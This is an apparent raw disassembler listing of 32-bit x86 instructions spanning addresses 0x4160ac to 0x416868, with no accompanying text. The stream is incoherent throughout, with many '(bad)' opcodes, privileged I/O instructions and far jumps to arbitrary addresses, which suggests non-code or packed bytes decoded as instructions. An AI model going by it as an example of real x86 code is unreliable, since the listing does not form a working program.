  4160ac:	xchg   ecx,eax
  4160ad:	pop    ebp
  4160ae:	mov    cl,0x26
  4160b0:	pop    eax
  4160b1:	push   ebp
  4160b2:	lea    ebx,[esi+0x72]
  4160b5:	adc    eax,DWORD PTR [esi+0x719e180a]
  4160bb:	out    dx,al
  4160bc:	std    
  4160bd:	aam    0xe3
  4160bf:	call   0xa5aeaa27
  4160c4:	xchg   esp,eax
  4160c5:	cmp    BYTE PTR [edi+0x715507f7],bh
  4160cb:	inc    esi
  4160cc:	or     DWORD PTR [ebx-0x7408c07],ebx
  4160d2:	mov    dl,0x2a
  4160d4:	jmp    0x4160f3
  4160d6:	jae    0x4160bb
  4160d8:	addr16 push ss
  4160da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160db:	out    0xfe,eax
  4160dd:	inc    ebx
  4160de:	mov    esp,DWORD PTR [ecx]
  4160e0:	fdiv   DWORD PTR [esp+ebp*8]
  4160e3:	push   0xffffff88
  4160e5:	mov    DWORD PTR [eax],eax
  4160e7:	add    ch,ah
  4160e9:	ins    DWORD PTR es:[edi],dx
  4160ea:	jnp    0x416148
  4160ec:	bound  esp,QWORD PTR [edi+0x5d7cc71e]
  4160f2:	xchg   esi,eax
  4160f3:	sub    BYTE PTR [ecx],bl
  4160f5:	rol    BYTE PTR [edi],1
  4160f7:	fiadd  WORD PTR [ebp-0x6b]
  4160fa:	test   BYTE PTR [edx+0x11588afd],0x14
  416101:	test   DWORD PTR [ebp-0x69],ecx
  416104:	(bad)  [edx]
  416106:	mov    eax,ds:0xd1aa53ba
  41610b:	xchg   ecx,eax
  41610c:	call   0xa17568d8
  416111:	into   
  416112:	pop    edi
  416113:	gs dec edi
  416115:	mov    es:0xda111e45,al
  41611b:	(bad)  
  41611c:	push   cs
  41611d:	and    al,0xd4
  41611f:	jbe    0x416191
  416121:	pop    esp
  416122:	cmp    eax,0xbfed4b45
  416127:	scas   eax,DWORD PTR es:[edi]
  416128:	pushf  
  416129:	scas   eax,DWORD PTR es:[edi]
  41612a:	mov    ch,0xd2
  41612c:	jle    0x416196
  41612e:	daa    
  41612f:	not    DWORD PTR [edi+0x3b]
  416132:	cmp    al,0x83
  416134:	lock data16 add dh,ch
  416138:	add    BYTE PTR [eax],al
  41613a:	in     eax,dx
  41613b:	push   eax
  41613c:	outs   dx,DWORD PTR ds:[esi]
  41613d:	push   ecx
  41613e:	daa    
  41613f:	fimul  WORD PTR ds:0xbaa95c5
  416145:	test   eax,0x98688eb6
  41614a:	ds push ecx
  41614c:	mov    dl,0xc9
  41614e:	and    dl,BYTE PTR [ebx]
  416150:	xchg   edx,eax
  416151:	mov    ah,0x33
  416153:	pushf  
  416154:	dec    eax
  416155:	and    BYTE PTR [eax],al
  416157:	add    ch,al
  416159:	outs   dx,DWORD PTR ds:[esi]
  41615a:	mov    ebx,0xcb312658
  41615f:	add    DWORD PTR [ecx-0x2b7a1822],esp
  416165:	sar    BYTE PTR [edx],cl
  416167:	in     eax,dx
  416168:	data16 adc BYTE PTR ds:0x8ef30000,0x95
  416170:	imul   edx,DWORD PTR [ecx-0x28],0x37
  416174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416175:	jnp    0x4161d7
  416177:	(bad)  
  416179:	lahf   
  41617a:	add    BYTE PTR [eax],al
  41617c:	(bad)  
  41617d:	in     al,dx
  41617e:	in     al,dx
  41617f:	mov    al,0xa9
  416181:	adc    BYTE PTR [eax],0xa2
  416184:	dec    ebp
  416185:	cld    
  416186:	clc    
  416187:	sub    DWORD PTR [edx],ebx
  416189:	(bad)  
  41618a:	in     eax,dx
  41618b:	pusha  
  41618c:	jno    0x416208
  41618e:	cmp    dl,BYTE PTR gs:[esi]
  416191:	and    ebx,DWORD PTR [esi]
  416193:	cmp    ecx,DWORD PTR [edi+eax*8+0x1e240000]
  41619a:	inc    esi
  41619b:	ds mov ah,0x73
  41619e:	dec    esi
  41619f:	jmp    0x3219ddd8
  4161a4:	xchg   esp,eax
  4161a5:	jb     0x4161a5
  4161a7:	lds    ebx,FWORD PTR [edx-0x35b7616c]
  4161ad:	add    BYTE PTR [eax],al
  4161af:	(bad)  
  4161b0:	sub    DWORD PTR [ecx+0x54623cd4],ecx
  4161b6:	cmp    ebp,esp
  4161b8:	or     al,0xe
  4161ba:	add    BYTE PTR [eax],al
  4161bc:	aas    
  4161bd:	push   es
  4161be:	call   0x9300:0x300dd
  4161c5:	loopne 0x41620d
  4161c7:	xor    dl,BYTE PTR [eax+esi*2+0x4e]
  4161cb:	jae    0x416167
  4161cd:	test   al,0x47
  4161cf:	adc    eax,0xcfe80dae
  4161d4:	add    BYTE PTR [eax],bh
  4161d6:	add    BYTE PTR [eax],al
  4161d8:	mov    ch,dh
  4161da:	(bad)  [eax+0x60f7d662]
  4161e0:	sbb    eax,DWORD PTR [edi]
  4161e2:	mov    BYTE PTR [esi+0x0],ah
  4161e5:	add    dl,ch
  4161e7:	xor    DWORD PTR [edi-0xb],edx
  4161ea:	lock ins BYTE PTR es:[edi],dx
  4161ec:	in     al,dx
  4161ed:	scas   al,BYTE PTR es:[edi]
  4161ee:	dec    cx
  4161f0:	arpl   WORD PTR [ebx-0x1],dx
  4161f3:	stos   DWORD PTR es:[edi],eax
  4161f4:	sahf   
  4161f5:	je     0x4161ee
  4161f7:	sti    
  4161f8:	std    
  4161f9:	mov    edx,DWORD PTR [ebx]
  4161fb:	movntq QWORD PTR [edi+0x50],mm5
  4161ff:	outs   dx,DWORD PTR ds:[esi]
  416200:	aas    
  416201:	test   DWORD PTR [edi+0x7ac6863a],esi
  416207:	retf   
  416208:	jl     0x416237
  41620a:	mov    ebx,0x11c80eb0
  41620f:	add    BYTE PTR [eax],al
  416211:	or     eax,0x94fc956d
  416216:	scas   al,BYTE PTR es:[edi]
  416217:	mov    BYTE PTR [esi],0xd6
  41621a:	adc    eax,0x22cc
  41621f:	push   esp
  416220:	nop
  416221:	jge    0x416235
  416223:	sub    eax,0xcb1d3a75
  416228:	in     eax,dx
  416229:	or     BYTE PTR [edx],0x0
  41622c:	add    ch,ah
  41622e:	xor    ecx,DWORD PTR [esi+0x34]
  416231:	ret    0x13b8
  416234:	cwde   
  416235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416236:	into   
  416237:	dec    edx
  416238:	cmc    
  416239:	fisub  DWORD PTR [esi+esi*2-0x5ef1bc0e]
  416240:	adc    ecx,DWORD PTR [edi+0x1d5b3c2f]
  416246:	push   ecx
  416247:	std    
  416248:	test   eax,0x9c418be9
  41624d:	jne    0x416212
  41624f:	sub    ah,BYTE PTR [ecx+0x5b]
  416252:	dec    ebp
  416253:	bound  di,DWORD PTR ds:0xdb82e958
  41625a:	adc    DWORD PTR [edx],edx
  41625c:	jmp    0x416212
  41625e:	jnp    0x416228
  416260:	and    al,0x0
  416262:	add    BYTE PTR [edi+0x30f50705],dl
  416268:	push   eax
  416269:	ret    
  41626a:	push   edi
  41626b:	mov    ?,WORD PTR [edx+0xdf30e32]
  416271:	push   ss
  416272:	add    dl,dl
  416274:	(bad)  
  416275:	lods   al,BYTE PTR ds:[esi]
  416276:	mov    dh,BYTE PTR [ebx-0x55]
  416279:	xchg   esi,eax
  41627a:	xchg   edx,eax
  41627b:	mov    cs,WORD PTR [edi]
  41627d:	mov    ah,BYTE PTR [ebx]
  41627f:	jmp    0xc9d1e193
  416284:	and    al,0x2e
  416286:	push   esi
  416287:	sbb    ah,BYTE PTR [edi-0x4f93341c]
  41628d:	jmp    0x264e9965
  416292:	and    eax,0xe108b9
  416297:	add    BYTE PTR [edx-0x65bcdc1d],dh
  41629d:	(bad)  
  41629e:	call   0x67eb7bf1
  4162a3:	lods   eax,DWORD PTR ds:[esi]
  4162a4:	shr    DWORD PTR [eax+0x10e9910],cl
  4162aa:	sbb    eax,0xa8b3ea32
  4162af:	mov    ds:0x6784,al
  4162b4:	idiv   al
  4162b6:	test   al,0x7f
  4162b8:	nop
  4162b9:	dec    edx
  4162ba:	mov    ebp,0x7c8bd5b4
  4162bf:	inc    edi
  4162c0:	dec    ecx
  4162c1:	and    esp,DWORD PTR [ebp+ebp*4-0x6562165f]
  4162c8:	and    al,0xdf
  4162ca:	mov    ecx,0xc81599e0
  4162cf:	outs   dx,BYTE PTR ds:[esi]
  4162d0:	add    BYTE PTR [eax],al
  4162d2:	jmp    0xdc63:0x6ab80723
  4162d9:	fwait
  4162da:	(bad)  
  4162db:	sub    bh,BYTE PTR [eax]
  4162dd:	adc    al,0x4f
  4162df:	add    al,0x87
  4162e1:	add    BYTE PTR [eax],al
  4162e3:	fcmovu st,st(0)
  4162e5:	xchg   ecx,eax
  4162e6:	(bad)  
  4162e7:	adc    DWORD PTR [ecx],edx
  4162e9:	data16 in al,dx
  4162eb:	test   BYTE PTR [edi-0x7ce0000],dl
  4162f1:	pushf  
  4162f2:	icebp  
  4162f3:	pop    esp
  4162f4:	mov    al,ds:0x5d533ad6
  4162f9:	mov    eax,ds:0x973d746a
  4162fe:	pop    esp
  4162ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416300:	xchg   bh,ah
  416302:	or     bh,BYTE PTR [ebp-0x37]
  416305:	and    ebx,DWORD PTR [edi]
  416307:	dec    edx
  416308:	sbb    eax,0x2c1399ea
  41630d:	clc    
  41630e:	or     eax,0x54b3ed59
  416313:	dec    esi
  416314:	xor    BYTE PTR [edx],al
  416316:	push   edx
  416317:	enter  0x72,0x0
  41631b:	xchg   ebx,eax
  41631c:	fistp  WORD PTR [ecx+0x71]
  41631f:	cld    
  416320:	xor    ah,ah
  416322:	xchg   BYTE PTR [edx-0x2a],bl
  416325:	sbb    DWORD PTR [ebp+0xa5cc4f],ebp
  41632b:	add    BYTE PTR [ecx],ch
  41632d:	inc    edx
  41632e:	iret   
  41632f:	mov    edx,0x16b89c18
  416334:	inc    esi
  416335:	sbb    DWORD PTR [edi-0x42],0x3f48011b
  41633c:	add    BYTE PTR [eax],al
  41633e:	xlat   BYTE PTR ds:[ebx]
  41633f:	mov    dh,0xf4
  416341:	xor    eax,ebx
  416343:	mov    ch,0xf6
  416345:	jl     0x4163ba
  416347:	sub    ebx,edx
  416349:	add    cl,BYTE PTR [ebx-0x71]
  41634c:	mov    dl,0xa7
  41634e:	mov    cl,0x2
  416350:	rol    BYTE PTR [esi+0xc],1
  416353:	imul   eax,DWORD PTR [eax],0x1cfef700
  416359:	fwait
  41635a:	jge    0x416387
  41635c:	mov    esi,0x9a4c5ef1
  416361:	add    BYTE PTR [eax],al
  416363:	mov    esi,gs
  416365:	add    BYTE PTR [eax],al
  416367:	push   ebx
  416368:	scas   eax,DWORD PTR es:[edi]
  416369:	push   ebx
  41636a:	pop    edx
  41636b:	in     al,dx
  41636c:	dec    esp
  41636d:	inc    edi
  41636e:	add    BYTE PTR [eax],al
  416370:	sbb    edi,DWORD PTR [edx-0x4e]
  416373:	jmp    0xb7ce5e7b
  416378:	add    BYTE PTR [eax],al
  41637a:	jecxz  0x416301
  41637c:	adc    DWORD PTR [eax+0x6d76e1f4],ebx
  416382:	jge    0x4163a0
  416384:	adc    DWORD PTR ds:0xe41970be,0x50ac24a6
  41638e:	fistp  WORD PTR [edi]
  416390:	pop    ecx
  416391:	or     al,0xa5
  416393:	add    BYTE PTR [eax],al
  416395:	jae    0x416383
  416397:	push   cs
  416398:	sub    esp,esp
  41639a:	aas    
  41639b:	mov    ebp,0x5f092939
  4163a0:	push   ds
  4163a1:	xchg   BYTE PTR ds:0x8c7f5ee9,al
  4163a7:	mov    al,0x0
  4163a9:	add    dh,ah
  4163ab:	scas   eax,DWORD PTR es:[edi]
  4163ac:	and    eax,0x48053d50
  4163b1:	aas    
  4163b2:	add    BYTE PTR [eax],al
  4163b4:	and    ebx,DWORD PTR [edi+edx*2]
  4163b7:	mul    DWORD PTR [ecx]
  4163b9:	jge    0x4163a0
  4163bb:	pop    esi
  4163bc:	mov    ds:0x99015e19,al
  4163c1:	out    dx,eax
  4163c2:	bound  eax,QWORD PTR [edx+0x41]
  4163c5:	xchg   ebp,eax
  4163c6:	mov    ds:0x5b84a7,al
  4163cb:	add    BYTE PTR [ebx-0x6d],ah
  4163ce:	test   eax,0x48d3913
  4163d3:	mov    BYTE PTR [eax],0x0
  4163d6:	int3   
  4163d7:	call   0x19d063dc
  4163dc:	jecxz  0x4163cf
  4163de:	cmp    al,0xbe
  4163e0:	cdq    
  4163e1:	cs inc esp
  4163e3:	or     eax,DWORD PTR [eax]
  4163e5:	add    BYTE PTR [edx],bl
  4163e7:	sbb    eax,0x308c6c
  4163ec:	add    BYTE PTR [esi+0x46],al
  4163ef:	mov    esi,0xd78878
  4163f4:	add    BYTE PTR ds:0xb92cf15f,ch
  4163fa:	inc    eax
  4163fb:	aam    0x0
  4163fd:	add    BYTE PTR [edi-0x5055c23e],bl
  416403:	iret   
  416404:	gs idiv ch
  416407:	js     0x416393
  416409:	jno    0x416416
  41640b:	arpl   WORD PTR [edi-0x11],dx
  41640e:	xor    edi,esp
  416410:	push   esp
  416411:	daa    
  416412:	loop   0x41648f
  416414:	out    0x21,al
  416416:	xchg   esi,eax
  416417:	mov    edi,0xbdf59012
  41641c:	cmp    al,0xeb
  41641e:	pop    esp
  41641f:	aam    0x4c
  416421:	lods   al,BYTE PTR ds:[esi]
  416422:	add    BYTE PTR [eax],al
  416424:	and    al,0xc
  416426:	jecxz  0x416428
  416428:	add    BYTE PTR [esi-0x4697df58],ah
  41642e:	ss push ebx
  416430:	jecxz  0x41646e
  416432:	adc    eax,0x40d0ca71
  416437:	xlat   BYTE PTR ds:[ebx]
  416438:	add    BYTE PTR [eax],al
  41643a:	fdivr  QWORD PTR [ecx-0x1572875]
  416440:	das    
  416441:	sbb    bh,ch
  416443:	(bad)  
  416444:	stc    
  416445:	call   0x6bb5:0x4d0114e3
  41644c:	sar    bl,1
  41644e:	jno    0x416427
  416450:	lods   al,BYTE PTR ds:[esi]
  416451:	loop   0x4163ea
  416453:	pop    esi
  416454:	nop
  416455:	mov    esi,0x37b24
  41645a:	fild   WORD PTR [eax]
  41645c:	add    bh,ah
  41645e:	cmp    DWORD PTR [edx-0x46],ecx
  416461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416462:	push   edi
  416463:	pop    es
  416464:	sti    
  416465:	inc    edx
  416466:	mov    ds:0x5e0461db,eax
  41646b:	add    BYTE PTR [eax],al
  41646d:	or     DWORD PTR [edi-0x3edbdf85],0xbdf8cd9c
  416477:	push   ebx
  416478:	mov    al,ds:0x78c7ba9f
  41647d:	mov    BYTE PTR [ebp+0x5b1afb3c],0x38
  416484:	mov    DWORD PTR [edi+0xf944cb],esp
  41648a:	add    BYTE PTR ds:0x631af545,ch
  416490:	retf   0xe7d2
  416493:	add    al,0xa6
  416495:	add    BYTE PTR [eax],al
  416497:	push   cs
  416498:	fs cdq 
  41649a:	or     DWORD PTR [edx-0x65185ef3],esp
  4164a0:	sub    al,0xcf
  4164a2:	data16 mov dl,0xdf
  4164a5:	inc    DWORD PTR [ecx-0x23]
  4164a8:	mov    eax,0xb5799c90
  4164ad:	fs adc esp,eax
  4164b0:	sti    
  4164b1:	cdq    
  4164b2:	jmp    0x9cd2a032
  4164b7:	dec    esp
  4164b8:	iret   
  4164b9:	add    BYTE PTR [eax],al
  4164bb:	jne    0x4164f9
  4164bd:	shl    cl,0x0
  4164c0:	add    BYTE PTR [eax],bl
  4164c2:	stc    
  4164c3:	ins    BYTE PTR es:[edi],dx
  4164c4:	sahf   
  4164c5:	lods   eax,DWORD PTR ds:[esi]
  4164c6:	jns    0x4164ab
  4164c8:	sbb    eax,0x881d86a5
  4164cd:	and    DWORD PTR [eax],eax
  4164cf:	add    BYTE PTR [ebx],cl
  4164d1:	xor    al,0xfd
  4164d3:	int3   
  4164d4:	inc    DWORD PTR [eax]
  4164d6:	add    BYTE PTR [ecx+0x2dc4],bh
  4164dc:	in     eax,0x0
  4164de:	ins    BYTE PTR es:[edi],dx
  4164df:	add    BYTE PTR [eax],al
  4164e1:	sbb    BYTE PTR [ebp+0x50],bl
  4164e4:	rcr    BYTE PTR [ebx-0xd],cl
  4164e7:	loopne 0x416534
  4164e9:	outs   dx,BYTE PTR ds:[esi]
  4164ea:	mov    bl,0xec
  4164ec:	push   eax
  4164ed:	mov    WORD PTR [ebx+0x2f850000],?
  4164f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f4:	jae    0x416482
  4164f6:	mov    ch,0x0
  4164f8:	add    BYTE PTR [ebx-0x16],ch
  4164fb:	fist   WORD PTR [edx]
  4164fd:	lods   eax,DWORD PTR ds:[esi]
  4164fe:	mov    esp,0xf57f288b
  416503:	in     eax,0xeb
  416505:	getsec 
  416507:	mov    ds:0x15301633,al
  41650c:	xchg   ebx,eax
  41650d:	add    eax,0x88291e7
  416512:	cmc    
  416513:	add    BYTE PTR [eax],al
  416515:	or     al,0xdf
  416517:	add    BYTE PTR [eax],al
  416519:	add    BYTE PTR [edi+0x53660000],ah
  41651f:	inc    ebp
  416520:	mov    bh,0x29
  416522:	push   es
  416523:	xor    edi,esi
  416525:	or     eax,0xed1b4a9b
  41652a:	jmp    0xa792:0xe0e1a373
  416531:	ss jp  0x4164f9
  416534:	mov    ebx,0xe4ed9ea6
  416539:	nop
  41653a:	leave  
  41653b:	xchg   esp,eax
  41653c:	leave  
  41653d:	jbe    0x4164eb
  41653f:	fisub  WORD PTR [edx]
  416541:	dec    edi
  416542:	cmp    al,0xb4
  416544:	ds cmp esp,ebp
  416547:	mov    cl,0xeb
  416549:	adc    esi,ebx
  41654b:	cmp    bh,BYTE PTR [ebx]
  41654d:	loopne 0x416560
  41654f:	xchg   BYTE PTR [edx+0x55473ab],dl
  416555:	sub    ecx,DWORD PTR [edx+0x6a]
  416558:	loope  0x4164e1
  41655a:	out    dx,al
  41655b:	sub    al,0xa
  41655d:	cmp    DWORD PTR [ecx],eax
  41655f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416560:	fstp   QWORD PTR ss:[ebx]
  416563:	cmp    al,0x2b
  416565:	dec    ebx
  416566:	push   edx
  416567:	inc    ecx
  416568:	mov    ebp,0x3188
  41656d:	repz push edx
  41656f:	mov    ?,edx
  416571:	lock xor bh,al
  416574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416575:	cli    
  416576:	aam    0xb6
  416578:	add    BYTE PTR [edi+0x0],bh
  41657b:	add    bh,dh
  41657d:	push   cs
  41657e:	lahf   
  41657f:	arpl   si,di
  416581:	lods   eax,DWORD PTR ds:[esi]
  416582:	or     bh,BYTE PTR [esi-0x4295ab3a]
  416588:	cdq    
  416589:	not    DWORD PTR [eax]
  41658b:	xor    eax,0x8888c5a7
  416590:	add    BYTE PTR [eax],al
  416592:	popf   
  416593:	(bad)  [esi]
  416595:	aam    0xb9
  416597:	jnp    0x4165d2
  416599:	stc    
  41659a:	imul   esp,DWORD PTR [esi+0x52c8],0xfffffffe
  4165a1:	and    eax,DWORD PTR [edx-0x70]
  4165a4:	inc    edi
  4165a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a6:	adc    esp,ebp
  4165a8:	jo     0x4165eb
  4165aa:	repnz dec ecx
  4165ac:	mov    BYTE PTR [ebx],ch
  4165ae:	add    BYTE PTR [eax],al
  4165b0:	cdq    
  4165b1:	mov    bl,0xd1
  4165b3:	stos   DWORD PTR es:[edi],eax
  4165b4:	ins    DWORD PTR es:[edi],dx
  4165b5:	loop   0x4165ed
  4165b7:	ins    DWORD PTR es:[edi],dx
  4165b8:	jle    0x416570
  4165ba:	fsub   st,st(3)
  4165bc:	into   
  4165bd:	(bad)  ds:[edx+0x46]
  4165c1:	push   ebp
  4165c2:	arpl   WORD PTR [esi],cx
  4165c4:	jp     0x41663e
  4165c6:	out    0x41,eax
  4165c8:	bound  esi,QWORD PTR [esi+0x79f259a9]
  4165ce:	call   0x87e2:0x2e7412a1
  4165d5:	pop    eax
  4165d6:	cmp    al,0xeb
  4165d8:	pop    ecx
  4165d9:	rcl    cl,1
  4165db:	(bad)  
  4165dc:	push   edx
  4165dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165de:	and    eax,0x6495cacd
  4165e3:	fmul   st,st(2)
  4165e5:	sbb    BYTE PTR [ebx+eax*1-0x15],dh
  4165e9:	jge    0x416599
  4165eb:	mov    dl,0x4e
  4165ed:	ss push ebp
  4165ef:	push   eax
  4165f0:	sbb    BYTE PTR [esi+0x15d2bce8],ch
  4165f6:	jg     0x4165de
  4165f8:	sub    ecx,DWORD PTR [ebp+0xac8c]
  4165fe:	mov    ah,0x2e
  416600:	mov    BYTE PTR [ecx],ch
  416602:	add    BYTE PTR [eax],al
  416604:	add    DWORD PTR [esi+0x72],edi
  416607:	rcr    DWORD PTR [ebx+0x11],cl
  41660a:	ja     0x4165a3
  41660c:	mov    bl,0xf
  41660e:	or     DWORD PTR [ebx],edx
  416610:	sbb    bh,BYTE PTR [ebx+0x1]
  416613:	cs (bad) 
  416616:	ds pop ss
  416618:	push   cs
  416619:	icebp  
  41661a:	sar    dh,0x0
  41661d:	add    dh,al
  41661f:	aam    0x5f
  416621:	mov    ecx,0xcf0fa9b2
  416626:	mov    ?,ecx
  416628:	shl    DWORD PTR [ebx],0xd0
  41662b:	out    dx,eax
  41662c:	mov    ebp,0x251641e
  416631:	retf   
  416632:	pop    ebp
  416633:	push   ss
  416634:	cdq    
  416635:	lea    ebp,[ebp-0x4c]
  416638:	or     DWORD PTR [eax+edi*2+0x66],esi
  41663c:	stos   DWORD PTR es:[edi],eax
  41663d:	scas   al,BYTE PTR es:[edi]
  41663e:	fmul   QWORD PTR [edi+0xa700]
  416644:	adc    ah,BYTE PTR [esi+0x21]
  416647:	add    ebp,eax
  416649:	(bad)  
  41664a:	jmp    0x6bbc788b
  41664f:	dec    ecx
  416650:	scas   eax,DWORD PTR es:[edi]
  416651:	cmp    dl,ch
  416653:	loopne 0x4165e1
  416655:	push   ebx
  416656:	add    BYTE PTR [eax],al
  416658:	pop    ds
  416659:	fild   QWORD PTR [edx]
  41665b:	retf   0x2ddf
  41665e:	int3   
  41665f:	test   al,0x0
  416661:	add    BYTE PTR [ebx],ah
  416663:	retf   
  416664:	cdq    
  416665:	cmc    
  416666:	rcr    BYTE PTR [ebp+0x151b0ea3],1
  41666c:	(bad)  
  41666d:	in     eax,dx
  41666e:	lods   al,BYTE PTR ds:[esi]
  41666f:	sub    cl,bl
  416671:	not    DWORD PTR [edx-0x2c]
  416674:	jb     0x416608
  416676:	pop    edi
  416677:	sbb    al,0x61
  416679:	stc    
  41667a:	iret   
  41667b:	jecxz  0x416629
  41667d:	sub    bh,BYTE PTR [edi-0xcd27eb]
  416683:	xor    BYTE PTR [ecx+0x6e0e2355],bh
  416689:	test   DWORD PTR [eax+0x6a000052],0x8179d499
  416693:	pop    es
  416694:	scas   eax,DWORD PTR es:[edi]
  416695:	enter  0x32,0x0
  416699:	push   0xedc8
  41669e:	(bad)  
  41669f:	sbb    esp,DWORD PTR [edi+0x7d0d469b]
  4166a5:	sbb    bl,BYTE PTR [ecx+0x38]
  4166a8:	cmp    esi,eax
  4166aa:	xchg   ecx,eax
  4166ab:	jle    0x41666a
  4166ad:	in     eax,0x67
  4166af:	dec    ebp
  4166b0:	ror    DWORD PTR [edi+eiz*8+0x0],0x0
  4166b5:	(bad)  
  4166b6:	mov    WORD PTR [ecx],fs
  4166b8:	add    BYTE PTR [eax],al
  4166ba:	xchg   edx,eax
  4166bb:	adc    edx,DWORD PTR [edi+0x6e]
  4166be:	std    
  4166bf:	mov    DWORD PTR [ecx+0x1dd74d90],edi
  4166c5:	jo     0x4166b0
  4166c7:	cmp    eax,0xf6e079cd
  4166cc:	pop    ecx
  4166cd:	loop   0x416744
  4166cf:	xchg   esi,eax
  4166d0:	popf   
  4166d1:	rcl    BYTE PTR es:[edi],cl
  4166d4:	sbb    DWORD PTR [ebp+0x5ec8e483],0x0
  4166db:	add    BYTE PTR [edi+0x58f49d20],ch
  4166e1:	jmp    0x4166a8
  4166e3:	or     dl,BYTE PTR [edx+esi*2-0x370e84f9]
  4166ea:	jg     0x4166ec
  4166ec:	add    BYTE PTR [ebp+0xad8e95b],bl
  4166f2:	push   ebp
  4166f3:	inc    ebx
  4166f4:	ret    0x2f36
  4166f7:	inc    edi
  4166f8:	neg    BYTE PTR [esi]
  4166fa:	adc    al,0xf2
  4166fc:	cmp    edi,edx
  4166fe:	jns    0x4166b8
  416700:	sahf   
  416701:	fs test al,0x38
  416704:	push   edi
  416705:	sub    bl,al
  416707:	pop    DWORD PTR ds:0xb47270e2
  41670d:	jp     0x4166d1
  41670f:	data16 fcomp DWORD PTR [edx+0x6e]
  416713:	imul   edi,DWORD PTR [ecx+0x7e],0xd7178d3
  41671a:	mov    esi,0x6a7551a
  41671f:	sub    ch,dl
  416721:	(bad)  
  416722:	ds loopne 0x416700
  416725:	mov    ebx,0xe58cfe
  41672a:	add    BYTE PTR [ebx-0xc],al
  41672d:	xchg   ecx,eax
  41672e:	imul   ebp,ebx,0xfbbefbe0
  416734:	jbe    0x416712
  416736:	push   eax
  416737:	sub    dl,0x65
  41673a:	arpl   WORD PTR ds:0x1d85cbe5,bp
  416740:	sbb    al,0x24
  416742:	sbb    DWORD PTR [edx],eax
  416744:	aam    0x7d
  416746:	cvtdq2ps xmm6,XMMWORD PTR [edi-0x57]
  41674a:	jae    0x41671b
  41674c:	sub    BYTE PTR [ecx+edx*8],ah
  41674f:	cmp    ebx,DWORD PTR [edi-0x55]
  416752:	cmp    al,0x30
  416754:	mov    bl,0x33
  416756:	and    al,0xef
  416758:	retf   
  416759:	and    eax,0xcfa7c134
  41675e:	push   esi
  41675f:	xchg   edx,eax
  416760:	jmp    0xac97:0xe8ff8a5d
  416767:	or     edx,DWORD PTR [eax+0x7e04ba03]
  41676d:	add    BYTE PTR [eax],al
  41676f:	cmc    
  416770:	adc    DWORD PTR [edi],edx
  416772:	imul   ebx,esp,0x73
  416775:	cld    
  416776:	test   DWORD PTR [edx],0x7bcc
  41677c:	mov    edi,0x7a67a334
  416781:	stc    
  416782:	nop
  416783:	push   esi
  416784:	jb     0x4167ca
  416786:	enter  0x0,0x3b
  41678a:	fs fwait
  41678c:	mov    edx,DWORD PTR [edi+esi*8-0x5fa7a1e8]
  416793:	xchg   edi,eax
  416794:	(bad)  
  416795:	sbb    edx,edx
  416797:	shl    BYTE PTR [ebp-0x8],1
  41679a:	xchg   ebx,eax
  41679b:	add    al,0x15
  41679d:	add    BYTE PTR [eax],al
  41679f:	pop    edx
  4167a0:	ret    
  4167a1:	pop    ds
  4167a2:	add    bh,bh
  4167a4:	add    BYTE PTR [eax],al
  4167a6:	int    0x60
  4167a8:	(bad)  [esi+0x5b]
  4167ab:	and    al,0xe5
  4167ad:	mov    ecx,0xffbe6920
  4167b2:	adc    dl,ch
  4167b4:	test   ebp,0xb07da3d4
  4167ba:	bound  esp,QWORD PTR [edi-0x39]
  4167bd:	jno    0x4167ae
  4167bf:	in     eax,0xba
  4167c1:	ja     0x416790
  4167c3:	and    DWORD PTR [edi+edx*4],eax
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	or     esi,DWORD PTR [edx]
  4167ca:	push   edi
  4167cb:	clc    
  4167cc:	scas   eax,DWORD PTR es:[edi]
  4167cd:	pop    ebp
  4167ce:	xchg   ch,al
  4167d0:	test   DWORD PTR [ecx-0x59934e39],ecx
  4167d6:	retf   0x8e32
  4167d9:	and    edi,DWORD PTR [edi-0x6c]
  4167dc:	inc    esp
  4167dd:	stos   DWORD PTR es:[edi],eax
  4167de:	add    BYTE PTR [eax],al
  4167e0:	cld    
  4167e1:	std    
  4167e2:	lock and ebx,DWORD PTR [esi+0x1243dc1e]
  4167e9:	cmp    al,0xa4
  4167eb:	mov    ds:0x194273df,al
  4167f0:	xlat   BYTE PTR ds:[ebx]
  4167f1:	add    dh,bh
  4167f3:	add    BYTE PTR [eax],al
  4167f5:	imul   eax,DWORD PTR [eax+0x50],0xe7b0000
  4167fc:	lods   al,BYTE PTR ds:[esi]
  4167fd:	shl    BYTE PTR [edi+0x61de0000],0xbb
  416804:	mov    edi,0xd5fb4fbe
  416809:	add    al,0xde
  41680b:	add    BYTE PTR [eax],al
  41680d:	je     0x4167b8
  41680f:	pop    esp
  416810:	pop    edx
  416811:	inc    esp
  416812:	adc    al,0x0
  416814:	add    BYTE PTR [ecx],bh
  416816:	out    dx,al
  416817:	fcomp  QWORD PTR [ebx+ebp*8+0x2b9e5e66]
  41681e:	int3   
  41681f:	sti    
  416820:	add    BYTE PTR [eax],al
  416822:	dec    ecx
  416823:	popa   
  416824:	dec    esi
  416825:	iret   
  416826:	pop    eax
  416827:	cld    
  416828:	add    eax,0x8fb4a75
  41682d:	push   esi
  41682e:	add    BYTE PTR [eax],al
  416830:	stos   BYTE PTR es:[edi],al
  416831:	imul   ecx,DWORD PTR [ebx+edx*8-0x3cb60000],0x939c9c45
  41683c:	aas    
  41683d:	xchg   bl,bh
  41683f:	mov    ch,0xca
  416841:	test   eax,0xd4843b
  416846:	add    BYTE PTR [ebx-0x463af535],bh
  41684c:	mov    esp,0x87b12911
  416851:	cmp    DWORD PTR [ecx+0x73e9f345],edi
  416857:	retf   
  416858:	in     eax,dx
  416859:	lods   eax,DWORD PTR ds:[esi]
  41685a:	out    0x24,eax
  41685c:	jae    0x41680a
  41685e:	xchg   ebp,eax
  41685f:	sti    
  416860:	jnp    0x416807
  416862:	call   esi
  416864:	add    dh,BYTE PTR [edx-0x2d]
  416867:	dec    esp
  416868:	jbe    0x41686a
